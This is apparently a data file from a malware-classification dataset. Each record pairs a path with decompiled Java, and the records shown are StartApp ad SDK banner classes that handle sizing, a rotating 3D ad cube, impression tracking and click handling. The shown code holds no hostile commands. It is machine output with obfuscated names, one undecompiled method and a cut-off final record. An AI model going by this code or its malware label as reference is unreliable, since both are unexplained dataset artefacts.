"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.banner3d\a.code","public class a {   public enum EnumC0052a {  XXSMALL(new com.startapp.android.publish.banner.a(280,50)),   XSMALL(new com.startapp.android.publish.banner.a(AdException.INVALID_REQUEST,50)),   SMALL(new com.startapp.android.publish.banner.a(320,50)),   MEDIUM(new com.startapp.android.publish.banner.a(468,60)),   LARGE(new com.startapp.android.publish.banner.a(728,90)),   XLARGE(new com.startapp.android.publish.banner.a(android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT,90));   private com.startapp.android.publish.banner.a g;   private com.startapp.android.publish.banner.a h=null;   EnumC0052a(  com.startapp.android.publish.banner.a aVar){     this.g=aVar;   }   public com.startapp.android.publish.banner.a a(){     return this.g;   } }   private com.startapp.android.publish.banner.a b(  Context context,  ViewParent viewParent,  BannerOptions bannerOptions){     View view;     Point point=new Point();     point.x=bannerOptions.d();     point.y=bannerOptions.e();     i.a(3,""=============== set Application Size ==========="");     if (context instanceof Activity) {       i.a(3,""Context is Activity"");       View decorView=((Activity)context).getWindow().getDecorView();       try {         View view2=(View)viewParent;         if (view2 instanceof Banner) {           i.a(3,""Parent is instance of Wrapper Banner"");           view=(View)view2.getParent();         }  else {           view=view2;         }         point.x=o.b(context,((view.getMeasuredWidth() - view.getPaddingLeft()) - view.getPaddingRight()) + 1);         point.y=o.b(context,((view.getMeasuredHeight() - view.getPaddingBottom()) - view.getPaddingTop()) + 1);       }  catch (      Exception e) {         point.x=o.b(context,decorView.getMeasuredWidth());         point.y=o.b(context,decorView.getMeasuredHeight());         i.a(3,""Exception occoured"");       }     }  else {       i.a(3,""Context not Activity, get max win size"");       WindowManager windowManager=(WindowManager)context.getSystemService(""window"");       if (windowManager != null) {         c.a(context,windowManager,point);       }     }     i.a(3,""============ exit Application Size ["" + point.x + "",""+ point.y+ ""] ========="");     return new com.startapp.android.publish.banner.a(point.x,point.y);   }   public boolean a(  Context context,  ViewParent viewParent,  BannerOptions bannerOptions){     i.a(3,""============== Optimize Size =========="");     com.startapp.android.publish.banner.a b=b(context,viewParent,bannerOptions);     boolean z=false;     for (    EnumC0052a enumC0052a : EnumC0052a.values()) {       if (enumC0052a.a().a() <= b.a() && enumC0052a.a().b() <= b.b()) {         i.a(3,""BannerSize ["" + enumC0052a.a().a() + "",""+ enumC0052a.a().b()+ ""]"");         bannerOptions.a(enumC0052a.a().a(),enumC0052a.a().b());         z=true;       }     }     if (!z) {       bannerOptions.a(0,0);     }     i.a(3,""============== Optimize Size ["" + z + ""] =========="");     return z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.banner3d\b.code","public class b extends RelativeLayout {   private TextView a;   private TextView b;   private ImageView c;   private l d;   private TextView e;   private Point f;   public enum a {  XS,   S,   M,   L,   XL}   public b(  Context context,  Point point){     super(context);     this.f=point;     a();   }   private void a(){     Context context=getContext();     a templateBySize=getTemplateBySize();     setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{MetaData.INSTANCE.getItemGradientTop(context),MetaData.INSTANCE.getItemGradientBottom(context)}));     setLayoutParams(new ViewGroup.LayoutParams(-2,-2));     int a2=o.a(context,2);     int a3=o.a(context,3);     o.a(context,4);     int a4=o.a(context,5);     int a5=o.a(context,6);     o.a(context,8);     o.a(context,10);     int a6=o.a(context,20);     o.a(context,84);     int a7=o.a(context,90);     setPadding(a4,0,a4,0);     setTag(this);     this.c=new ImageView(context);     this.c.setId(1);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(a7,a7);     layoutParams.addRule(15);     this.c.setLayoutParams(layoutParams);     this.c.setPadding(0,0,a5,0);     this.a=new TextView(context);     this.a.setId(2);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,1);     layoutParams2.addRule(14);     this.a.setLayoutParams(layoutParams2);     this.a.setTextColor(MetaData.INSTANCE.getItemTitleTextColor(context).intValue()); switch (templateBySize) { case XS: case S: case M:       this.a.setTextSize(17.0f);     this.a.setPadding(a3,0,0,a2);   layoutParams2.width=o.a(getContext(),(int)(this.f.x * 0.8d)); break; case L: case XL: this.a.setTextSize(22.0f); this.a.setPadding(a3,0,0,a4); break; } this.a.setSingleLine(true); this.a.setEllipsize(TextUtils.TruncateAt.END); o.a(this.a,MetaData.INSTANCE.getItemTitleTextDecoration(context)); this.b=new TextView(context); this.b.setId(3); RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-1,-2); layoutParams3.addRule(1,1); layoutParams3.addRule(3,2); layoutParams3.setMargins(0,0,0,a4); this.b.setLayoutParams(layoutParams3); this.b.setTextColor(MetaData.INSTANCE.getItemDescriptionTextColor(context).intValue()); this.b.setTextSize(18.0f); this.b.setMaxLines(2); this.b.setLines(2); this.b.setSingleLine(false); this.b.setEllipsize(TextUtils.TruncateAt.MARQUEE); this.b.setHorizontallyScrolling(true); this.d=new l(getContext()); this.d.setId(5); RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2); switch (templateBySize) { case XS: case S: case M: layoutParams4.addRule(1,1); layoutParams4.addRule(8,1); break; case L: case XL: layoutParams4.addRule(1,2); layoutParams3.width=o.a(getContext(),(int)(this.f.x * 0.6d)); break; } layoutParams4.setMargins(a3,0,a3,0); this.d.setLayoutParams(layoutParams4); this.e=new TextView(context); RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2); switch (templateBySize) { case XS: case S: case M: this.e.setTextSize(13.0f); layoutParams5.addRule(1,2); layoutParams5.addRule(15); break; case L: case XL: layoutParams5.addRule(1,3); layoutParams5.addRule(15); layoutParams5.setMargins(a6,0,0,0); this.e.setTextSize(26.0f); break; } this.e.setPadding(a5,a5,a5,a5); this.e.setLayoutParams(layoutParams5); setButtonText(false); this.e.setTextColor(-1); this.e.setTypeface(null,1); this.e.setId(4); this.e.setShadowLayer(2.5f,-3.0f,3.0f,-9013642); this.e.setBackgroundDrawable(new ShapeDrawable(new RoundRectShape(new float[]{10.0f,10.0f,10.0f,10.0f,10.0f,10.0f,10.0f,10.0f},null,null)){ @Override protected void onDraw(Shape shape,Canvas canvas,Paint paint){ paint.setShader(new LinearGradient(0.0f,0.0f,0.0f,shape.getHeight(),-4466580,-11363070,Shader.TileMode.REPEAT)); paint.setMaskFilter(new EmbossMaskFilter(new float[]{1.0f,1.0f,1.0f},0.4f,5.0f,3.0f)); super.onDraw(shape,canvas,paint); } } ); addView(this.c); addView(this.a); switch (templateBySize) { case XS: case S: case M: addView(this.e); break; case L: case XL: addView(this.e); addView(this.b); break; } addView(this.d); } private String[] a(String str){ boolean z; String[] strArr=new String[2]; if (str.length() > 55) { char[] charArray=str.substring(0,55).toCharArray(); int length=charArray.length - 1; int i=length - 1; while (true) { if (i <= 0) { i=length; z=false; break; } if (charArray[i] == ' ') { z=true; break; } i--; } int i2=z ? i : 55; strArr[0]=str.substring(0,i2); strArr[1]=str.substring(i2 + 1,str.length()); }  else { strArr[0]=str; strArr[1]=null; } return strArr; } private a getTemplateBySize(){ a aVar=a.S; if (this.f.x > a.EnumC0052a.SMALL.a().a() || this.f.y > a.EnumC0052a.SMALL.a().b()) { aVar=a.M; } if (this.f.x > a.EnumC0052a.MEDIUM.a().a() || this.f.y > a.EnumC0052a.MEDIUM.a().b()) { aVar=a.L; } return (this.f.x > a.EnumC0052a.LARGE.a().a() || this.f.y > a.EnumC0052a.LARGE.a().b()) ? a.XL : aVar; } public void a(int i,int i2,int i3){ this.c.setImageResource(i); ViewGroup.LayoutParams layoutParams=this.c.getLayoutParams(); layoutParams.width=i2; layoutParams.height=i3; this.c.setLayoutParams(layoutParams); } public void a(Bitmap bitmap,int i,int i2){ this.c.setImageBitmap(bitmap); ViewGroup.LayoutParams layoutParams=this.c.getLayoutParams(); layoutParams.width=i; layoutParams.height=i2; this.c.setLayoutParams(layoutParams); } public void setButtonText(boolean z){ if (z) { this.e.setText(""OPEN""); }  else { this.e.setText(""DOWNLOAD""); } } public void setDescription(String str){ if (str == null || str.compareTo("""") == 0) { return; } String[] a2=a(str); String str2=a2[0]; String str3=a2[1] != null ? a(a2[1])[0] : """"; if (str.length() >= 110) { str3=str3 + ""...""; } this.b.setText(str2 + ""\n"" + str3); } public void setImage(Bitmap bitmap){ this.c.setImageBitmap(bitmap); } public void setRating(float f){ this.d.setRating(f); } public void setText(String str){ this.a.setText(str); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.banner3d\Banner3D.code","public class Banner3D extends RelativeLayout implements AdEventListener {   private static final float HEIGHT_RATIO=0.82f;   private static final String TAG=""StartAppWall.Banner3D"";   private static final int TIMEOUT_RESTORE=200;   private static final float WIDTH_RATIO=0.95f;   private AdPreferences adPreferences;   private com.startapp.android.publish.a.a ads;   private List<AdDetails> adsItems;   private boolean animation;   private Camera camera;   private int currentBannerIndex;   private boolean defaultLoad;   private List<Banner3DFace> faces;   private boolean loaded;   private boolean loading;   private Runnable mAutoRotation;   private Matrix matrix;   private BannerOptions options;   private AdInformationOverrides overrides;   private Paint paint;   private boolean rotating;   private float rotation;   private a sizes;   private float startY;   private boolean touchDown;   private boolean visible; public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel parcel){         return new SavedState(parcel);       }       @Override public SavedState[] newArray(      int i){         return new SavedState[i];       }     } ;     public boolean bDefaultLoad;     public boolean bIsVisible;     private int currentImage;     private AdDetails[] details;     public Banner3DFace[] faces;     public boolean loaded;     public boolean loading;     public AdInformationOverrides overrides;     private float rotation;     private SavedState(    Parcel parcel){       super(parcel);       if (parcel.readInt() != 1) {         this.bIsVisible=false;         return;       }       this.bIsVisible=true;       this.currentImage=parcel.readInt();       this.rotation=parcel.readFloat();       Parcelable[] readParcelableArray=parcel.readParcelableArray(AdDetails.class.getClassLoader());       if (readParcelableArray != null) {         this.details=new AdDetails[readParcelableArray.length];         System.arraycopy(readParcelableArray,0,this.details,0,readParcelableArray.length);       }       int readInt=parcel.readInt();       this.loaded=false;       if (readInt == 1) {         this.loaded=true;       }       int readInt2=parcel.readInt();       this.loading=false;       if (readInt2 == 1) {         this.loading=true;       }       int readInt3=parcel.readInt();       this.bDefaultLoad=false;       if (readInt3 == 1) {         this.bDefaultLoad=true;       }       int readInt4=parcel.readInt();       if (readInt4 > 0) {         this.faces=new Banner3DFace[readInt4];         for (int i=0; i < readInt4; i++) {           this.faces[i]=(Banner3DFace)parcel.readParcelable(Banner3DFace.class.getClassLoader());         }       }       this.overrides=(AdInformationOverrides)parcel.readParcelable(AdInformationOverrides.class.getClassLoader());     }     SavedState(    Parcelable parcelable){       super(parcelable);     }     @Override public int describeContents(){       return 0;     }     public int getCurrentImage(){       return this.currentImage;     }     public List<AdDetails> getDetails(){       return Arrays.asList(this.details);     }     public float getRotation(){       return this.rotation;     }     public void setCurrentImage(    int i){       this.currentImage=i;     }     public void setDetails(    List<AdDetails> list){       this.details=new AdDetails[list.size()];       int i=0;       while (true) {         int i2=i;         if (i2 >= list.size()) {           return;         }         this.details[i2]=list.get(i2);         i=i2 + 1;       }     }     public void setRotation(    float f){       this.rotation=f;     }     @Override public void writeToParcel(    Parcel parcel,    int i){       super.writeToParcel(parcel,i);       if (!this.bIsVisible) {         parcel.writeInt(0);         return;       }       parcel.writeInt(1);       parcel.writeInt(this.currentImage);       parcel.writeFloat(this.rotation);       parcel.writeParcelableArray(this.details,i);       parcel.writeInt(this.loaded ? 1 : 0);       parcel.writeInt(this.loading ? 1 : 0);       parcel.writeInt(this.bDefaultLoad ? 1 : 0);       parcel.writeInt(this.faces.length);       for (int i2=0; i2 < this.faces.length; i2++) {         parcel.writeParcelable(this.faces[i2],i);       }       parcel.writeParcelable(this.overrides,i);     }   }   public Banner3D(  Context context){     super(context);     this.options=new BannerOptions();     this.sizes=new a();     this.adsItems=new ArrayList();     this.adPreferences=new AdPreferences();     this.camera=null;     this.matrix=null;     this.paint=null;     this.rotation=45.0f;     this.startY=0.0f;     this.rotating=true;     this.touchDown=false;     this.animation=false;     this.visible=true;     this.defaultLoad=true;     this.loaded=false;     this.loading=false;     this.overrides=AdInformationOverrides.a();     this.faces=new ArrayList();     this.currentBannerIndex=0;     this.mAutoRotation=new Runnable(){       @Override public void run(){         if (Banner3D.this.visible && Banner3D.this.isShown()) {           ((Banner3DFace)Banner3D.this.faces.get(Banner3D.this.getCurrentBannerIndex())).a(Banner3D.this.getContext());         }         if (Banner3D.this.rotating) {           Banner3D.this.rotate(Banner3D.this.getBannerOptions().b());         }         if (Banner3D.this.rotation <= 90 - Banner3D.this.getBannerOptions().b() || Banner3D.this.rotation >= Banner3D.this.getBannerOptions().b() + 90) {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().a());         }  else {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().c());         }       }     } ;     init();   }   public Banner3D(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.options=new BannerOptions();     this.sizes=new a();     this.adsItems=new ArrayList();     this.adPreferences=new AdPreferences();     this.camera=null;     this.matrix=null;     this.paint=null;     this.rotation=45.0f;     this.startY=0.0f;     this.rotating=true;     this.touchDown=false;     this.animation=false;     this.visible=true;     this.defaultLoad=true;     this.loaded=false;     this.loading=false;     this.overrides=AdInformationOverrides.a();     this.faces=new ArrayList();     this.currentBannerIndex=0;     this.mAutoRotation=new Runnable(){       @Override public void run(){         if (Banner3D.this.visible && Banner3D.this.isShown()) {           ((Banner3DFace)Banner3D.this.faces.get(Banner3D.this.getCurrentBannerIndex())).a(Banner3D.this.getContext());         }         if (Banner3D.this.rotating) {           Banner3D.this.rotate(Banner3D.this.getBannerOptions().b());         }         if (Banner3D.this.rotation <= 90 - Banner3D.this.getBannerOptions().b() || Banner3D.this.rotation >= Banner3D.this.getBannerOptions().b() + 90) {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().a());         }  else {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().c());         }       }     } ;     init();   }   public Banner3D(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.options=new BannerOptions();     this.sizes=new a();     this.adsItems=new ArrayList();     this.adPreferences=new AdPreferences();     this.camera=null;     this.matrix=null;     this.paint=null;     this.rotation=45.0f;     this.startY=0.0f;     this.rotating=true;     this.touchDown=false;     this.animation=false;     this.visible=true;     this.defaultLoad=true;     this.loaded=false;     this.loading=false;     this.overrides=AdInformationOverrides.a();     this.faces=new ArrayList();     this.currentBannerIndex=0;     this.mAutoRotation=new Runnable(){       @Override public void run(){         if (Banner3D.this.visible && Banner3D.this.isShown()) {           ((Banner3DFace)Banner3D.this.faces.get(Banner3D.this.getCurrentBannerIndex())).a(Banner3D.this.getContext());         }         if (Banner3D.this.rotating) {           Banner3D.this.rotate(Banner3D.this.getBannerOptions().b());         }         if (Banner3D.this.rotation <= 90 - Banner3D.this.getBannerOptions().b() || Banner3D.this.rotation >= Banner3D.this.getBannerOptions().b() + 90) {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().a());         }  else {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().c());         }       }     } ;     init();   }   public Banner3D(  Context context,  boolean z){     this(context,z,new AdPreferences());   }   public Banner3D(  Context context,  boolean z,  AdPreferences adPreferences){     super(context);     this.options=new BannerOptions();     this.sizes=new a();     this.adsItems=new ArrayList();     this.adPreferences=new AdPreferences();     this.camera=null;     this.matrix=null;     this.paint=null;     this.rotation=45.0f;     this.startY=0.0f;     this.rotating=true;     this.touchDown=false;     this.animation=false;     this.visible=true;     this.defaultLoad=true;     this.loaded=false;     this.loading=false;     this.overrides=AdInformationOverrides.a();     this.faces=new ArrayList();     this.currentBannerIndex=0;     this.mAutoRotation=new Runnable(){       @Override public void run(){         if (Banner3D.this.visible && Banner3D.this.isShown()) {           ((Banner3DFace)Banner3D.this.faces.get(Banner3D.this.getCurrentBannerIndex())).a(Banner3D.this.getContext());         }         if (Banner3D.this.rotating) {           Banner3D.this.rotate(Banner3D.this.getBannerOptions().b());         }         if (Banner3D.this.rotation <= 90 - Banner3D.this.getBannerOptions().b() || Banner3D.this.rotation >= Banner3D.this.getBannerOptions().b() + 90) {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().a());         }  else {           Banner3D.this.postDelayed(this,Banner3D.this.getBannerOptions().c());         }       }     } ;     this.defaultLoad=z;     this.adPreferences=adPreferences;     init();   }   private void addAdInformationLayout(){     RelativeLayout relativeLayout=new RelativeLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams((int)(getSuggestedMinimumWidth() * WIDTH_RATIO),(int)(getSuggestedMinimumHeight() * HEIGHT_RATIO));     layoutParams.addRule(13);     addView(relativeLayout,layoutParams);     new com.startapp.android.publish.adinformation.b(getContext(),b.EnumC0051b.SMALL,AdPreferences.Placement.INAPP_BANNER,this.overrides).a(relativeLayout);   }   private void drawFace(  Canvas canvas,  Bitmap bitmap,  int i,  int i2,  int i3,  int i4,  float f,  float f2){     if (this.camera == null) {       this.camera=new Camera();     }     this.camera.save();     this.camera.translate(0.0f,0.0f,i4);     this.camera.rotateX(f2);     this.camera.translate(0.0f,0.0f,-i4);     if (this.matrix == null) {       this.matrix=new Matrix();     }     this.camera.getMatrix(this.matrix);     this.camera.restore();     this.matrix.preTranslate(-i3,-i4);     this.matrix.postScale(f,f);     this.matrix.postTranslate(i2 + i3,i + i4);     canvas.drawBitmap(bitmap,this.matrix,this.paint);   }   private void drawFrame(  Canvas canvas){     try {       int a=(int)(o.a(getContext(),this.options.d()) * WIDTH_RATIO);       int a2=(int)(o.a(getContext(),this.options.e()) * HEIGHT_RATIO);       int width=(getWidth() - a) / 2;       int height=(getHeight() - a2) / 2;       Bitmap previousBitmap=getPreviousBitmap();       Bitmap currentBitmap=getCurrentBitmap();       if (currentBitmap != null && previousBitmap != null) {         if (this.rotation < 45.0f) {           drawFace(canvas,previousBitmap,height,width,a / 2,a2 / 2,1.0f,this.rotation);           if (this.rotation > 3.0f) {             drawFace(canvas,currentBitmap,height,width,a / 2,a2 / 2,1.0f,this.rotation - 90.0f);           }         }  else {           drawFace(canvas,currentBitmap,height,width,a / 2,a2 / 2,1.0f,this.rotation - 90.0f);           if (this.rotation < 87.0f) {             drawFace(canvas,previousBitmap,height,width,a / 2,a2 / 2,1.0f,this.rotation);           }         }       }     }  catch (    Exception e) {       i.a(6,""Exception onDraw Banner3D"");     }   }   public BannerOptions getBannerOptions(){     return this.options;   }   public int getCurrentBannerIndex(){     return this.currentBannerIndex;   }   private Bitmap getCurrentBitmap(){     return this.faces.get(getCurrentBannerIndex()).b();   }   private Bitmap getPreviousBitmap(){     return this.faces.get(((getCurrentBannerIndex() - 1) + this.faces.size()) % this.faces.size()).b();   }   private int getTotalBaners(){     return this.faces.size();   }   private void init(){     if (isInEditMode()) {       initDebug();     }  else {       initRuntime();     }   }   private void initDebug(){     setMinimumWidth(o.a(getContext(),AdException.INVALID_REQUEST));     setMinimumHeight(o.a(getContext(),50));     setBackgroundColor(Color.rgb(169,169,169));     TextView textView=new TextView(getContext());     textView.setText(""StartApp Banner3D"");     textView.setTextColor(-16777216);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(13);     addView(textView,layoutParams);   }   private void initFaces(  List<AdDetails> list){     this.faces=new ArrayList();     Iterator<AdDetails> it=list.iterator();     while (it.hasNext()) {       this.faces.add(new Banner3DFace(getContext(),this,it.next(),getBannerOptions()));     }     this.currentBannerIndex=0;   }   private void initRuntime(){     if (this.loading) {       return;     }     this.loading=true;     setBackgroundColor(0);     postDelayed(new Runnable(){       @Override public void run(){         if (Banner3D.this.defaultLoad) {           Banner3D.this.load();         }       }     } ,200L);   }   public void loadBanners(  List<AdDetails> list){     this.adsItems=list;     if (list != null) {       setBannerOptions(MetaData.INSTANCE.getBannerOption(getContext()));       if (!setBannerSize()) {         i.a(6,""StartAppWall.Banner3DError in banner screen size"");         setVisibility(8);         return;       }       setMinimumWidth(o.a(getContext(),this.options.d()));       setMinimumHeight(o.a(getContext(),this.options.e()));       if (this.faces == null || this.faces.size() == 0) {         initFaces(list);       }  else {         Iterator<Banner3DFace> it=this.faces.iterator();         while (it.hasNext()) {           it.next().a(getContext(),getBannerOptions(),this);         }       }       addAdInformationLayout();       if (this.paint == null) {         this.paint=new Paint();         this.paint.setAntiAlias(true);         this.paint.setFilterBitmap(true);       }       if (!this.animation) {         this.animation=true;         post(this.mAutoRotation);       }       if (this.visible) {         setVisibility(0);       }     }   }   private void nextBanner(){     this.currentBannerIndex=(this.currentBannerIndex + 1) % getTotalBaners();   }   private void prevBanner(){     this.currentBannerIndex=((this.currentBannerIndex - 1) + getTotalBaners()) % getTotalBaners();   }   public void rotate(  float f){     this.rotation+=f;     if (this.rotation >= 90.0f) {       nextBanner();       this.rotation-=90.0f;     }     if (this.rotation <= 0.0f) {       prevBanner();       this.rotation+=90.0f;     }     invalidate();   }   private void setBannerOptions(  BannerOptions bannerOptions){     if (this.options.equals(bannerOptions)) {       return;     }     this.options=bannerOptions;   }   private boolean setBannerSize(){     return this.sizes.a(getContext(),getParent(),getBannerOptions());   }   public void hideBanner(){     this.visible=false;     setVisibility(8);   }   public void load(){     if (this.loaded) {       return;     }     this.ads=new com.startapp.android.publish.a.a(getContext());     if (this.adPreferences == null) {       this.adPreferences=new AdPreferences();     }     this.ads.load(this.adPreferences,this);     this.loading=false;   }   @Override protected void onDraw(  Canvas canvas){     super.onDraw(canvas);     if (isInEditMode() || !this.visible) {       return;     }     drawFrame(canvas);   }   @Override public void onFailedToReceiveAd(  Ad ad){   }   @Override public void onReceiveAd(  Ad ad){     this.overrides=this.ads.getAdInfoOverride();     loadBanners(((f)ad).a());   }   @Override protected void onRestoreInstanceState(  Parcelable parcelable){     if (!(parcelable instanceof SavedState)) {       super.onRestoreInstanceState(parcelable);       return;     }     SavedState savedState=(SavedState)parcelable;     this.visible=savedState.bIsVisible;     if (this.visible) {       this.adsItems=savedState.getDetails();       this.rotation=savedState.getRotation();       this.currentBannerIndex=savedState.getCurrentImage();       Banner3DFace[] banner3DFaceArr=savedState.faces;       this.faces=new ArrayList();       if (banner3DFaceArr != null) {         for (        Banner3DFace banner3DFace : banner3DFaceArr) {           this.faces.add(banner3DFace);         }       }       this.loaded=savedState.loaded;       this.loading=savedState.loading;       this.defaultLoad=savedState.bDefaultLoad;       this.overrides=savedState.overrides;       if (this.adsItems.size() == 0) {         this.defaultLoad=true;         init();       }  else {         post(new Runnable(){           @Override public void run(){             Banner3D.this.loadBanners(Banner3D.this.adsItems);           }         } );       }     }     super.onRestoreInstanceState(savedState.getSuperState());   }   @Override protected Parcelable onSaveInstanceState(){     SavedState savedState=new SavedState(super.onSaveInstanceState());     savedState.bIsVisible=this.visible;     savedState.setDetails(this.adsItems);     savedState.setRotation(this.rotation);     savedState.setCurrentImage(this.currentBannerIndex);     savedState.faces=new Banner3DFace[this.faces.size()];     savedState.loaded=this.loaded;     savedState.loading=this.loading;     savedState.overrides=this.overrides;     int i=0;     while (true) {       int i2=i;       if (i2 >= this.faces.size()) {         return savedState;       }       savedState.faces[i2]=this.faces.get(i2);       i=i2 + 1;     }   }   @Override public boolean onTouchEvent(  android.view.MotionEvent r5){     throw new UnsupportedOperationException(""Method not decompiled: com.startapp.android.publish.banner.banner3d.Banner3D.onTouchEvent(android.view.MotionEvent):boolean"");   }   public void showBanner(){     this.visible=true;     setVisibility(0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.banner3d\Banner3DFace.code","public class Banner3DFace implements Parcelable, e.a {   public static final Parcelable.Creator<Banner3DFace> CREATOR=new Parcelable.Creator<Banner3DFace>(){     @Override public Banner3DFace createFromParcel(    Parcel parcel){       return new Banner3DFace(parcel);     }     @Override public Banner3DFace[] newArray(    int i){       return new Banner3DFace[i];     }   } ;   private AdDetails a;   private Point b;   private Bitmap c;   private Bitmap d;   private Boolean e;   private b f;   public Banner3DFace(  Context context,  ViewGroup viewGroup,  AdDetails adDetails,  BannerOptions bannerOptions){     this.c=null;     this.d=null;     this.e=false;     this.f=null;     this.a=adDetails;     a(context,bannerOptions,viewGroup);   }   public Banner3DFace(  Parcel parcel){     this.c=null;     this.d=null;     this.e=false;     this.f=null;     this.a=(AdDetails)parcel.readParcelable(AdDetails.class.getClassLoader());     this.b=new Point(1,1);     this.b.x=parcel.readInt();     this.b.y=parcel.readInt();     this.c=(Bitmap)parcel.readParcelable(Bitmap.class.getClassLoader());     this.d=(Bitmap)parcel.readParcelable(Bitmap.class.getClassLoader());     boolean[] zArr=new boolean[1];     parcel.readBooleanArray(zArr);     this.e=Boolean.valueOf(zArr[0]);   }   private Bitmap a(  View view){     view.measure(view.getMeasuredWidth(),view.getMeasuredHeight());     Bitmap createBitmap=Bitmap.createBitmap(view.getMeasuredWidth(),view.getMeasuredHeight(),Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(createBitmap);     view.layout(0,0,view.getMeasuredWidth(),view.getMeasuredHeight());     view.draw(canvas);     return createBitmap;   }   private void a(  String str,  String str2,  String str3,  Context context){     p.a(context,str3);     Intent launchIntentForPackage=context.getPackageManager().getLaunchIntentForPackage(str);     if (str2 != null) {       try {         JSONObject jSONObject=new JSONObject(str2);         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String valueOf=String.valueOf(keys.next());           launchIntentForPackage.putExtra(valueOf,String.valueOf(jSONObject.get(valueOf)));         }       }  catch (      JSONException e) {         i.a(6,""Couldn't parse intent details json!"",e);       }     }     context.startActivity(launchIntentForPackage);   }   private void c(){     this.d=a(this.f);     if (this.b.x <= 0 || this.b.y <= 0) {       return;     }     this.d=Bitmap.createScaledBitmap(this.d,this.b.x,this.b.y,false);   }   public AdDetails a(){     return this.a;   }   public void a(  Context context){     if (this.e.booleanValue()) {       return;     }     i.a(3,""Sending Impression: ["" + a().getTitle() + ""]"");     p.a(context,a().getTrackingUrl());     this.e=true;   }   public void a(  Context context,  BannerOptions bannerOptions,  ViewGroup viewGroup){     int a=o.a(context,bannerOptions.e() - 5);     this.b=new Point((int)(o.a(context,bannerOptions.d()) * 0.95f),(int)(o.a(context,bannerOptions.e()) * 0.82f));     this.f=new b(context,new Point(bannerOptions.d(),bannerOptions.e()));     this.f.setText(a().getTitle());     this.f.setRating(a().getRating());     this.f.setDescription(a().getDescription());     this.f.setButtonText(this.a.isCPE());     if (this.c != null) {       this.f.a(this.c,a,a);     }  else {       this.f.a(R.drawable.sym_def_app_icon,a,a);       new e(a().getImageUrl(),this,0).execute(new Void[0]);       i.a(3,"" Banner Face Image Async Request: ["" + a().getTitle() + ""]"");     }     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(this.b.x,this.b.y);     layoutParams.addRule(13);     viewGroup.addView(this.f,layoutParams);     this.f.setVisibility(8);     c();   }   @Override public void a(  Bitmap bitmap,  int i){     if (bitmap == null || this.f == null) {       return;     }     this.c=bitmap;     this.f.setImage(bitmap);     c();   }   public Bitmap b(){     return this.d;   }   public void b(  Context context){     String intentPackageName=a().getIntentPackageName();     if (intentPackageName != null && !""null"".equals(intentPackageName) && !TextUtils.isEmpty(intentPackageName)) {       a(intentPackageName,a().getIntentDetails(),a().getClickUrl(),context);     }  else {       if (a().isSmartRedirect()) {         p.a(context,a().getClickUrl(),4000);         return;       }       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(a().getClickUrl()));       context.startActivity(intent);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeParcelable(a(),i);     parcel.writeInt(this.b.x);     parcel.writeInt(this.b.y);     parcel.writeParcelable(this.c,i);     parcel.writeParcelable(b(),i);     parcel.writeBooleanArray(new boolean[]{this.e.booleanValue()});   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.banner3d\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel parcel){       return new SavedState(parcel);     }     @Override public SavedState[] newArray(    int i){       return new SavedState[i];     }   } ;   public boolean bDefaultLoad;   public boolean bIsVisible;   private int currentImage;   private AdDetails[] details;   public Banner3DFace[] faces;   public boolean loaded;   public boolean loading;   public AdInformationOverrides overrides;   private float rotation;   private SavedState(  Parcel parcel){     super(parcel);     if (parcel.readInt() != 1) {       this.bIsVisible=false;       return;     }     this.bIsVisible=true;     this.currentImage=parcel.readInt();     this.rotation=parcel.readFloat();     Parcelable[] readParcelableArray=parcel.readParcelableArray(AdDetails.class.getClassLoader());     if (readParcelableArray != null) {       this.details=new AdDetails[readParcelableArray.length];       System.arraycopy(readParcelableArray,0,this.details,0,readParcelableArray.length);     }     int readInt=parcel.readInt();     this.loaded=false;     if (readInt == 1) {       this.loaded=true;     }     int readInt2=parcel.readInt();     this.loading=false;     if (readInt2 == 1) {       this.loading=true;     }     int readInt3=parcel.readInt();     this.bDefaultLoad=false;     if (readInt3 == 1) {       this.bDefaultLoad=true;     }     int readInt4=parcel.readInt();     if 